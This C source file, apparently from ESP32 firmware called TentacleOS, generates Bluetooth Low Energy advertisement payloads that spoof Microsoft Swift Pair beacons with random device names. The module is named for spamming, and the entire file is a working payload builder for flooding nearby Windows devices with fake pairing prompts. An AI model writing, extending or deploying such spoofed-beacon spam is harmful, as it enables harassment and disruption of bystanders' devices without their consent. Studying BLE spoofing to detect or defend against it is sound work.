// Copyright (c) 2025 HIGH CODE LLC
//
// TentacleOS is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// TentacleOS is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with TentacleOS. If not, see <https://www.gnu.org/licenses/>.

#include "swift_pair_spam.h"

#include <string.h>

#include "esp_random.h"

static const char *TAG = "SWIFT_PAIR_SPAM";

#define SWIFT_PAIR_NAME_MAX_LEN 11
#define SWIFT_PAIR_CHARSET_LEN  52
#define SWIFT_PAIR_HEADER_SIZE  7

static char *generate_random_name(void) {
  static char name[SWIFT_PAIR_NAME_MAX_LEN + 1];
  const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  int len = (esp_random() % 10) + 1;
  for (int i = 0; i < len; ++i) {
    name[i] = charset[esp_random() % SWIFT_PAIR_CHARSET_LEN];
  }
  name[len] = '\0';
  return name;
}

int generate_swift_pair_payload(uint8_t *buffer, size_t max_len) {
  if (buffer == NULL)
    return 0;

  char *name = generate_random_name();
  uint8_t name_len = strlen(name);
  if (SWIFT_PAIR_HEADER_SIZE + name_len > max_len)
    name_len = max_len - SWIFT_PAIR_HEADER_SIZE;

  uint8_t i = 0;
  buffer[i++] = 6 + name_len; // Length
  buffer[i++] = 0xFF;         // Type: Manufacturer Specific
  buffer[i++] = 0x06;         // Microsoft ID LSB
  buffer[i++] = 0x00;         // Microsoft ID MSB
  buffer[i++] = 0x03;         // Beacon Code
  buffer[i++] = 0x00;
  buffer[i++] = 0x80;
  memcpy(&buffer[i], name, name_len);
  return i + name_len;
}
